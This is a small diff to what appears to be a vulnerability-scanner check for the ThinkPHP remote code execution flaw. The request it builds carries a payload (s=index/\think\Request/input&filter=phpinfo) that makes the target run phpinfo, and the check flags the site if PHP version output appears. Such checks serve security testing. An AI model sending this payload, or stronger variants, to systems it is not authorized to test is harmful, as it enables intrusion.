@@ -20,7 +20,7 @@ def run(url, timeout):
         "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
     }
     try:
-        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1')
+        vurl = url + '/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1'
         req = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
         req2 = requests.get(url, headers=headers, timeout=timeout, verify=False)
         if "PHP Version" in req.text and "PHP Version" not in req2.text:
